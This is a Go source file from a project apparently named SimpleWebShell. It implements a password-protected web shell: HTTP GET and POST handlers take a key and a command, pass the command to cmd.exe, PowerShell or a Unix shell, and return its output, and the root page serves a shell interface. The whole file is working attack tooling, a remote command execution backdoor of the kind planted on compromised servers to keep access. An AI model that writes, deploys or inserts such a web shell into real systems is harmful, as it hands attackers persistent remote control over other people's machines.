package route

import (
	"SimpleWebShell/pages"
	"fmt"
	"net/http"
	"net/url"
	"os/exec"
	"strings"

	"github.com/gin-gonic/gin"
)

// 处理根路径
func handleRoot(c *gin.Context) {
	// 检查密钥
	key := c.Query("key")
	if key != password {
		// 密钥不正确，只显示基本信息
		c.String(http.StatusOK, "SimpleWebshell 1.0.0 By tyza66")
		return
	}

	// 密钥正确，显示WebShell界面
	c.Header("Content-Type", "text/html; charset=utf-8")
	c.String(http.StatusOK, pages.GetWebShellHTML())
}

// 处理GET请求执行shell命令
func handleGet(c *gin.Context) {
	// 验证密钥
	key := c.Query("key")
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	// 获取命令并进行URL解码
	cmdEncoded := c.Query("cmd")
	if cmdEncoded == "" {
		c.String(http.StatusBadRequest, "缺少cmd参数")
		return
	}

	// URL解码命令参数
	cmd, err := url.QueryUnescape(cmdEncoded)
	if err != nil {
		c.String(http.StatusBadRequest, fmt.Sprintf("命令参数解码错误: %v", err))
		return
	}

	// 执行命令
	result, err := executeCommand(cmd)
	if err != nil {
		c.String(http.StatusInternalServerError, fmt.Sprintf("命令执行错误: %v", err))
		return
	}

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, result)
}

// 处理POST请求执行shell命令
func handlePost(c *gin.Context) {
	// 检查Content-Type
	contentType := c.GetHeader("Content-Type")

	var key, cmd string

	if strings.Contains(contentType, "application/json") {
		// 处理JSON格式
		var jsonData struct {
			Key string `json:"key"`
			Cmd string `json:"cmd"`
		}

		if err := c.ShouldBindJSON(&jsonData); err != nil {
			c.String(http.StatusBadRequest, fmt.Sprintf("JSON解析错误: %v", err))
			return
		}

		key = jsonData.Key
		cmd = jsonData.Cmd
	} else {
		// 处理表单格式（向后兼容）
		key = c.PostForm("key")
		cmd = c.PostForm("cmd")
	}

	// 验证密钥
	if key != password {
		c.String(http.StatusUnauthorized, "Unauthorized")
		return
	}

	// 获取命令
	if cmd == "" {
		c.String(http.StatusBadRequest, "缺少cmd参数")
		return
	}

	// 执行命令
	result, err := executeCommand(cmd)
	if err != nil {
		c.String(http.StatusInternalServerError, fmt.Sprintf("命令执行错误: %v", err))
		return
	}

	c.Header("Content-Type", "text/plain; charset=utf-8")
	c.String(http.StatusOK, result)
}

// 执行shell命令
func executeCommand(cmdStr string) (string, error) {
	var cmd *exec.Cmd

	// 根据shell类型使用不同的参数
	shellLower := strings.ToLower(shellPath)
	if strings.Contains(shellLower, "cmd") || strings.Contains(shellLower, "cmd.exe") {
		// Windows CMD 使用 /c 参数
		cmd = exec.Command(shellPath, "/c", cmdStr)
	} else if strings.Contains(shellLower, "powershell") || strings.Contains(shellLower, "pwsh") {
		// PowerShell 使用 -Command 参数
		cmd = exec.Command(shellPath, "-Command", cmdStr)
	} else {
		// Linux/Unix shells (bash, sh, zsh等) 使用 -c 参数
		cmd = exec.Command(shellPath, "-c", cmdStr)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), err
	}
	return string(output), nil
}
